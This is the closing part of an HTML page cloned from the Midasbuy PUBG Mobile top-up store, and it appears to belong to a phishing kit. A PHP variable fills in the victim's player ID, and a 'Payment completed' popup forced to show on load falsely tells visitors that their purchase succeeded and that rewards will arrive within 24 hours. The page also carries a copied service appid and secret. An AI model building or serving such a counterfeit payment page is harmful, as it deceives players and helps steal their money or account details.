                    <div class="swiper-pagination swiper-pagination-clickable swiper-pagination-bullets"></div>
                </div>
                <div class="mc"></div>


                <div class="nav-box">
                    <div class="main" data-tab="tab-list">
                        <ul>

                            <li class="list" cr="game_zone" data-tab-button="homeButtoin">
                                <a class="go-homepage-btn">PUBG Mobile</a>
                            </li>


                            <li class="list tab-count" :class="{ active: currentHightLight === 'currency'}">
                                <a class="go-currency-btn">Purchase</a>
                            </li>


                            <li class="list tab-count" :class="{ active: currentHightLight === 'redeem'}">
                                <a class="go-redeem-btn">Redeem</a>
                            </li>


                            <li class="list tab-count" :class="{ active: currentHightLight === 'items'}">
                                <a class="go-shop-btn">Shop</a>
                            </li>



                            <li class="list tab-count ">
                                <a class="go-promotions-btn">Promotions</a>
                            </li>

                        </ul>
                    </div>
                </div>

            </div>

            <script type="application/javascript">
                function setNavPosition() {
                    $('.banner-wrap .nav-box li').each(function() {
                        if ($(this).hasClass('active')) {
                            var index = $('.banner-wrap .nav-box li').index(this);
                            var homeElementWidth = $('.banner-wrap .nav-box li').get(0).getBoundingClientRect().width;
                            var windowWidth = window.innerWidth;
                            var outerWidth = $(this).outerWidth(true);
                            // 中间值
                            var left = (windowWidth - outerWidth) / 2 - 20;
                            var offsetleft = $('.banner-wrap .nav-box li').get(index).offsetLeft;
                            var target = left - offsetleft;
                            if (target > 0) {
                                $('.banner-wrap .nav-box .main').get(0).scrollLeft = 0;
                                return;
                            }
                            $('.banner-wrap .nav-box .main').get(0).scrollLeft = 200;
                        }
                    })
                }
                $(function() {
                    setNavPosition();
                });
            </script>

            <div class="content">
                <div class="x-main">



                    <message v-bind:is-notification="0" v-bind:is-rtl="0" notify-title="Free Egg Cracker Suit Set!" text="Get Free Egg Cracker Suit Set! Follow our Facebook" color="blue" prop-img="https://cdn.midasbuy.com/images/wecom-temp-f67c92a977b5b4346edba5715b310e7df67c92a9.png" market-href="https://www.midasbuy.com/events/register/pubgm?lan=en&amp;from=__mds_buy_banner.topupmessage" scroll-time="" @show="showMessageBox">
                        <template #more>more</template>
                    </message>

                    <message-box ref="messageBox" title="Free Egg Cracker Suit Set!" desc="Get Free Egg Cracker Suit Set! Follow our Facebook" btn="Understand" @ok="closeMessageBox"></message-box>


                    <div class="tab-nav-box sub-game-account">
                        <div class="section tab-nav-box sub-game-account sub-id g-clr">
                            <ul>
                                <li class="active"> Player ID Verification <em class="help-icon"></em></li>
                            </ul>
                            <div class="tab-box">
                                <div class="box id-box active">
                                    <div class="y-box">
									<div class="mess">
									<div class="id" style="">
									<span class="label">Player ID:</span>
									<p class="val"><?php echo $playid;?></p>
									</div>
									</div>
									<div class="link-mod-a">
									<a href="/">Edit</a>
									</div>
									</div>
                                    <p class="auxiliary-tips"> Currently only supports top-up service for wecomics Android users</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="pay-type-box payment g-clr">
                        <div class="title g-clr">
                            <p>Payment Method</p>
                        </div>

                        <tabv2 ref="tab" :tabs_data="tabsData" v-on:active="onTabActive" :select_tab="selectTab" :lan="lanRes.midascoinChannel" :defaultshownum="defaultShowNum" @hideallchilds="hideAllChilds" payment_tip="" select_text="Choose" select_title="Choose The Bank" :showall="showAll" :show-help-pop.sync="showHelpPop" :channel-help.sync="channelHelp" :taskallowchannel="taskAllowChannel"></tabv2>
                        <div class="other-paymen-box" v-show="tabsData.length > defaultShowNum">
                            <p class="other-payment" @click="toggleShow" :class="{active: showAll}">Other Payment Method</p>
                        </div>
                    </div>
                    <div class="section game-pay-section">
                        <div class="title g-clr">
                            <p>Select Product</p>
                        </div>
                        <div :class="vipClass" class="section vip-market-message g-clr" style="display:block">
                            <div class="mess">
                                <em class="icon"></em>
                                <div ref="vipMsgBoxRef" class="auto-roll-box">
                                    <div :class="['auto-roll', { play: scrollVipMsg } ]">
                                        <p ref="vipMsgRef">{{ lanRes.vipPromotionMessage }}</p>
                                        <p v-if="scrollVipMsg">{{ lanRes.vipPromotionMessage }}</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <listv2 v-bind:datas="currentList" v-on:active="onSelectProduct" ref="productlist"></listv2>
                    </div>
                </div>
                <div class="taxes-bg"></div>
                <div class="clause-bg" style="display: none;"></div>
                <div class="pay-sec">
                    <div class="id-mess" v-if="userInfo">
                        <div class="x-main">
                            <p> {{ getPayUserMsg }} </p>
                        </div>
                    </div>
                    <div class="x-main">
                        <taxes-pop :lanres="lanRes" :current_product="currentProduct" :pay_available="!isEditStatus" @handle_pay="pay"></taxes-pop>
                        <div class="right">
                            <div class="model-bubble" :style="{ display: showVipPop ? 'block' : 'none' }"> {{ lanRes.vipPopContent }} </div>
                            <div class="pay-id-mess pc-show-mod" v-if="userInfo">
                                <p> {{ getPayUserMsg }} </p>
                            </div>
                            <div class="pay-mess">
                                <div class="t">
                                    <p class="label">Total:&nbsp;</p>
                                    <p class="total">{{currentProduct.fprice}}</p>
                                </div>
                                <div class="b">
                                    <p class="label taxes-label"><span class="taxes">Price includes taxes</span></p>
                                </div>
                            </div>
                            <div class="pay-btn" @click="pay" v-bind:class="{ disable: isEditStatus || lockPayBtn }">
                                Pay now
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <help-pop :helpPopContent="getHelpPopContent" :showHelpPop.sync="showHelpPop"></help-pop>
            <!-- 用户id填写指引弹窗 -->
            <found-id-pop :lanres="lanRes" :images="images" :show_find_openid.sync="showFindOpenid"></found-id-pop>
            <div class="pop-mode-box" v-bind:style="{display:showErrorBox?'block':'none'}" style="display: none">
                <div class="pop-mode pay-fail-pop show">
                    <div class="mess">
                        <p>{{ payErrorInfo ? payErrorInfo : 'Payment failed.' }}</p>
                    </div>
                    <div class="btn-wrap">
                        <div class="btn btn-l" cr="error_back" @click="showErrorBox=!showErrorBox">Back</div>
                    </div>
                </div>
            </div>
            <div class="found-id-pop" v-bind:style="{display:showFindOpenid?'block':'none'}" style="display: none">
                <div class="pop-boxs" style="display:block">
                    <p class="title">Couldn&#39;t find your Player ID?</p>

                    <div class="list">
                        <p class="label">1. Enter the game</p>
                        <img src="https://cdn.midasbuy.com/images/apps/pubgm/guide001.png" alt="img">
                    </div>


                    <div class="list">
                        <p class="label">2. Find your player ID</p>
                        <img src="https://cdn.midasbuy.com/images/apps/pubgm/guide002.png" alt="img">
                    </div>


                    <div class="btn-wrap">
                        <div class="btn" @click="showFindOpenid=false">OK</div>
                    </div>
                </div>
            </div>
            <rchannel-box ref="rchannelPop" v-on:clickbtn="onClickRchannelPop" v-bind:lansres="lansres" v-bind:clist="recommendChannels"></rchannel-box>
            <wechat-pop ref="wechatPop" :show.sync="showWechatPop" :channel="activeTab" :css="cssObj"></wechat-pop>
            <iframe-pop ref="iframePop" :show.sync="showIframePop" :channel="activeTab" :css="cssObj"></iframe-pop>
            <alertbox ref="alertbox" title="Tip" desc="Please refresh and try again." btn="OK" v-on:ok="refreshPage"></alertbox>
            <pop-mode ref="popMode" v-model="popModeOption"></pop-mode>
            <toast ref="toast" v-model="toastOption"></toast>
            <pop-input :option="popInputOption"></pop-input>


            <div class="pop-mode-box" style=" display: none; " v-bind:style="{display:showResPop?'block':'none'}">
                <div class="pop-mode" style="display:none;" :style="{ display: resQueryPop ? 'block' : 'none' }">
                    <div class="mess">
                        <p class="warn-icon">Please complete the payment soon</p>
                    </div>
                    <div class="btn-wrap btn-wraps">
                        <div class="btn cancel-btn" @click="cancel">Back</div>
                        <div class="btn comfirm-btn" @click="queryRes(0)"> Payment completed</div>
                    </div>
                </div>


                <div class="pop-mode" style="display:none;" :style="{display: noResFound ? 'block': 'none'}">
                    <div class="mess have-desc">
                        <p class="warn-icon"> Payment result not found</p>
                    </div>
                    <div class="desc min-desc">
                        <p> There might be some lag. If the payment has been completed, please check the game later.</p>
                    </div>
                    <div class="btn-wrap">
                        <div class="btn" @click="iknow">OK</div>
                    </div>
                </div>

            </div>
            <!-- 协议弹窗 -->
            <compliance-clause-pop report_prefix="payment_" :lan="lansres" :has_checked_clause.sync="checkedAgreement" :clause_pop_status.sync="clausePopStatus" @handle_confirm="handleConfirmPurchase"></compliance-clause-pop>
            <!-- 生日弹窗 -->
            <birthday-pop report_prefix="payment_" :lan="lansres" :show_birthday_pop.sync="showBirthdayPop" @handle_next_step="handleNextStep"></birthday-pop>
            <footer-comp></footer-comp>
			
			<div class="pop-mode-box" style="display: block;">
                <div class="pop-mode" style="display: block;">
                    <div class="mess have-desc">
                        <p class="warn-icon"> Payment completed</p>
                    </div>
                    <div class="desc min-desc">
                        <p>Payment for item purchases has been made successfully</p>
						<br>
                        <p>Please wait up to 24 hours, the reward will be sent to your account via in-game mail box</p>
                    </div>
                    <div class="btn-wrap">
                        <div class="btn" onclick="location.href='https://www.midasbuy.com/midasbuy/';">OK</div>
                    </div>
                </div>
            </div>
			
        </div>
        <script type="text/javascript">
            (function() {
                var tfgOp = {
                    'appid': 'TEG2P2YkivqDyIC1',
                    'secret': 'xO2OUb60j1KeBeip',
                    'thost': 'https://dp.telesafe.qq.com/f4',
                    'fphost': 'https://dp.telesafe.qq.com/t3'
                };
                window.tfp = window.tfp || function() {
                    (window.tfp.q = window.tfp.q || []).push(arguments);
                };
                tfp('config', tfgOp);

                var s = document.createElement('script');
                s.type = 'text/javascript';
                s.async = true;
                var r = navigator.userAgent;
                var isIELow = r.indexOf('MSIE 8.0') >= 0 || r.indexOf('MSIE 9.0') >= 0;
                s.src = isIELow ? 'https://3gimg.qq.com/tele_safe/static/tfg/pc/tfg.ie8.1.1.3.js' : 'https://3gimg.qq.com/tele_safe/static/tfg/pc/tfg.v1.0.18.js';
                var script = document.getElementsByTagName('script')[0];
                script.parentNode.insertBefore(s, script);
            })();
        </script>
        <script>
            loadJS(document, 'script', 'kepler', 'https://kepler.captcha.qcloud.com/tencent-kepler.js?appId=9865970', {
                onload: function() {
                    window.TencentKepler && window.TencentKepler.predict && window.TencentKepler.predict(function(WebTicket) {
                        window.___Kepler_WebTicket = WebTicket;
                    });
                }
            });
        </script>
        <script>
            window._SERVER_DATA = {};
            window.__NavState = {
                bubblePopConfig: {
                    "bubbleShow": true,
                    "href": "https://www.midasbuy.com/midasbuy/{0}/event/register/pubgm?lan=en&from=__mds_buy_bubble",
                    "promoteShow": true,
                    "repalce": false
                },
                blockLogin: 0,
                blockcountry: 0,
                latestRelease: {},
                country: "ot",
                countryInfo: {
                    "area": "Others",
                    "cgi_language": "en",
                    "cname": "其他",
                    "currency_config": {
                        "currencySymbol": " USD"
                    },
                    "currency_type": "USD",
                    "flag": "https://cdn.midasbuy.com/images/30ee99398.png",
                    "iso": {
                        "language": "en",
                        "region": "ot"
                    },
                    "lang": ["en"],
                    "links": {
                        "feedback": "",
                        "game_fb": "",
                        "media_fb": "",
                        "privacystatement": "",
                        "termofservice": ""
                    },
                    "midasbuyArea": "Other",
                    "name": "Others",
                    "status": "1"
                },
                showRecordEntrance: true,
                showFBLike: false,
                links: {
                    "downloadlink": "",
                    "facebookLink": "",
                    "feedback": "",
                    "gamelogoLink": "",
                    "officialwebsite": "",
                    "privacystatement": "",
                    "supplementaryTerms": "",
                    "termofservice": ""
                },
                lanRes: {
                    "accountSettings": "View Account",
                    "cardManage": "Payment Manage",
                    "checkVipStatus": "Check your status after log in",
                    "events": "Event Center",
                    "followFB": "Follow Midasbuy",
                    "helpcenter": "Help Center",
                    "helpcenterLink": "https://cdn.midasbuy.com/oversea_web/faq/faq.html",
                    "index": "Home",
                    "login": "SIGN IN",
                    "logout": "Sign Out",
                    "midasVip": "Midasbuy VIP",
                    "myAccount": "My Account",
                    "pcenter": "Account  Setting",
                    "register": "CREATE ACCOUNT",
                    "transactionRecord": "Transcation Record"
                },
                appDownloadConfig: {
                    "enable": false,
                    "gradually": ["0-100"],
                    "qrCode": "https://cdn.midasbuy.com/app/apk/Midasbuy_1.1.3.44_release_production-signed.png",
                    "url": "https://cdn.midasbuy.com/app/apk/Midasbuy_1.1.3.44_release_production-signed.apk"
                },
                showHomeEntry: true,
                sellRedeem: true,
                sellCurrency: true,
                sellSubscribe: false,
                sellGoods: true,
                titleName: "PUBG Mobile"

            }
            window.__CommonState = {
                enabled: {
                    "facebook_attention": true
                },
                isMobile: false,
                rtl: 0,
            };
            window.__FooterState = {
                disableFeedBack: 0,
                links: {
                    "downloadlink": "",
                    "facebookLink": "",
                    "feedback": "",
                    "gamelogoLink": "",
                    "officialwebsite": "",
                    "privacystatement": "",
                    "supplementaryTerms": "",
                    "termofservice": ""
                },
                lanRes: {
                    "cookieCloseBtn": "Save and close",
                    "cookieOff": "OFF",
                    "cookieOn": "ON",
                    "cookieP1": "We use cookies that are necessary to provide the service and also other cookies, including third-party cookies for performance and analysis. For more information on our cookie policy, please click here.    ",
                    "cookieP2": "These cookies are necessary to provide you with the service and to use some of its features, such as to facilitate transactions.",
                    "cookieP3": "These cookies are used to measure and analyse how the service is accessed, used, or is performing in order to provide you with a better   user experience and to maintain, operate and continually improve the service.",
                    "cookieT": "YOUR COOKIE PREFERENCES",
                    "cookieT2": "Necessary Cookies",
                    "cookieT3": "Analytics Cookies",
                    "copyright": "COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED.",
                    "cstips": "For customer service, please contact us via email help@midasbuy.com or Facebook inbox.",
                    "cstips1": "For customer service ",
                    "cstips2": "Please send email to help@midasbuy.com",
                    "facebook": "Facebook",
                    "feedback": "Feedback",
                    "followFB": "Follow Midasbuy",
                    "followUs": "Follow us on",
                    "privacystatement": "Privacy Policy",
                    "termofcookie": "Cookie Perferences",
                    "termofservice": "Terms of Service"
                },
                footerSocialConfig: [{
                    "defaultImage": "https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-fb.png",
                    "hoverImage": "https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-fb-hover.png",
                    "href": "",
                    "name": "facebook"
                }, {
                    "defaultImage": "https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-twitter.png",
                    "hoverImage": "https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-twitter-hover.png",
                    "href": "",
                    "name": "twitter"
                }, {
                    "defaultImage": "https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-ins.png",
                    "hoverImage": "https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-ins-hover.png",
                    "href": "",
                    "name": "ins"
                }, {
                    "defaultImage": "https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-youtube.png",
                    "hoverImage": "https://cdn.midasbuy.com/oversea_web/static/images/footer/footer-youtube-hover.png",
                    "href": "",
                    "name": "youtube"
                }],
                defaultDisableGaCountryList: [],
            }
        </script>

        <script>
            var devMode = false
            var autoReportConfig = {}
        </script>

        <script src="https://cdn.midasbuy.com/oversea_web/static/js/footer.161179a8.js"></script>
        <script src="https://cdn.midasbuy.com/oversea_web/static/js/buypage.2f19e880.js"></script>
    </div>
    <script>
        //监听滚动停止
        var scrollT1 = 0;
        var scrollT2 = 0;
        var scrollTimer = null;
        var setPosition = function(isBottom) {
            if (isBottom) {
                if (setPosition.isBottom) {
                    return;
                }

                $('.pay-sec,.wrap').addClass('pay-sec-flex');
                $('.pay-sec').show();
                $('.footer').addClass('show').show();
                setPosition.isBottom = 1;

            } else {
                // if(!setPosition.isBottom){ return; }
                $('.pay-sec,.wrap').removeClass('pay-sec-flex');
                $('.footer').removeClass('show');
                setPosition.isBottom = 0;
            }
        }
        window.showClauseBg = function() {
            $('.clause-bg').show();
            $('.clause-box-pop').show();
        }
        window.hideClauseBg = function() {
            $('.clause-box-pop').hide();
            setTimeout(function() {
                $('.clause-bg').fadeOut();
            }, 100)
        }
        window.hideTaxPop = function() {
            $('.taxes-bg').fadeOut();
            $('.taxes-box-pop').fadeOut();
        }
        window.showBirthBox = function() {
            $('#birthBox').show();
            $('body').css({
                'overflow': 'hidden'
            });
        };

        window.hideBirthBox = function() {
            $('#birthBox').hide();
            $('body').css({
                'overflow': 'auto'
            });
        };

        function isScrollEnd() {
            scrollT2 = $(document).scrollTop();
            if (scrollT2 == scrollT1) {
                $('.follow').removeClass('scrollStar')
                clearTimeout(scrollTimer)
            }
        }
        $(function() {
            if ($(window).innerHeight() > $(document).height()) {
                setPosition(1);
            } else {
                $(window).on("scroll", throttle(function() {
                    var docHeight = $(document).height();
                    if ($('.wrap').hasClass('pay-sec-flex')) {
                        if ($(window).width() <= 768) {
                            docHeight = docHeight * 1 - 120;
                        } else {
                            docHeight = docHeight * 1 - 180;
                        }
                    }
                    var isBottom = Math.ceil($(window).scrollTop() + window.innerHeight) >= docHeight;
                    setPosition(isBottom);
                    // 移动端FB点赞处理
                    clearTimeout(scrollTimer)
                    $('.follow').addClass('scrollStar')
                    scrollTimer = setTimeout(isScrollEnd, 100)
                    scrollT1 = $(document).scrollTop()
                }, 200));
            }


            $('.clause-bg,.clause-box-pop .close').on('click', function() {
                window.hideClauseBg();
            });
        });
    </script>

    <script>
        report.view('topupv2');
        report.setPage('topupv2');
        report.performance('topupv2');
    </script>

</body>
</html>